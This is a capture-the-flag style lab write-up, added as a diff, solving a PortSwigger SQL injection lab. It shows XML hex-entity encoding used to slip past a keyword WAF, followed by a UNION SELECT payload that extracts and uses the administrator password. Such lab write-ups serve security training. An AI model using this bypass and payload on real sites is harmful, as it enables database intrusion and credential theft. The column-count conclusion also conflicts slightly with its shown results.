@@ -1,0 +1,65 @@
+SQL INJECTION - PORTSWIGGER ACADEMY LAB
+Date: 2026-01-12
+Lab: SQL injection with filter bypass via XML encoding
+Target: https://0a8d00f004726cf3811ce9df003600c0.web-security-academy.net
+Objective: Extract admin credentials from users table and login
+Status: SOLVED
+
+PHASE 1 - DETECTION
+Request captured:
+POST /product/stock HTTP/2
+Content-Type: application/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+Simple character test:
+storeId=1' → HTTP 403 "Attack detected" (WAF triggered)
+
+PHASE 2 - IDENTIFICATION
+2.1 WAF Bypass
+Tool: Burp Hackvertor extension
+Encoding: hex_entities (XML encoding)
+Test: <@hex_entities>1'</@hex_entities> → HTTP 200 "0 units" ✓ Bypass confirmed
+
+2.2 Number of columns
+UNION NULL test:
+<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>
+→ "517 units
+null" (partial result visible)
+
+<storeId><@hex_entities>1 UNION SELECT NULL,NULL</@hex_entities></storeId>
+→ "0 units" (2 columns in query, 1 visible numeric column)
+
+PHASE 3 - EXPLOITATION UNION-BASED
+Target: users table (username, password)
+
+Final payload:
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+<productId>1</productId>
+<storeId><@hex_entities>1 UNION SELECT password from users where username='administrator'</@hex_entities></storeId>
+</stockCheck>
+
+Response:
+HTTP/2 200 OK
+517 units
+po1r3cacps5bux1sqx4f
+
+Extracted credentials:
+username: administrator
+password: po1r3cacps5bux1sqx4f
+
+Post-exploitation:
+Login to /my-account with administrator:po1r3cacps5bux1sqx4f → SUCCESS
+Lab status: SOLVED ✓
+
+Key learnings:
+- XML POST requests vulnerable to SQLi despite WAF
+- Hackvertor hex_entities bypasses keyword-based WAF
+- Single numeric column exploitation via direct SELECT
+- Targeted attack faster than full enumeration (users table known from description)
+
+Tools used:
+- Burp Suite Professional
+- Hackvertor extension
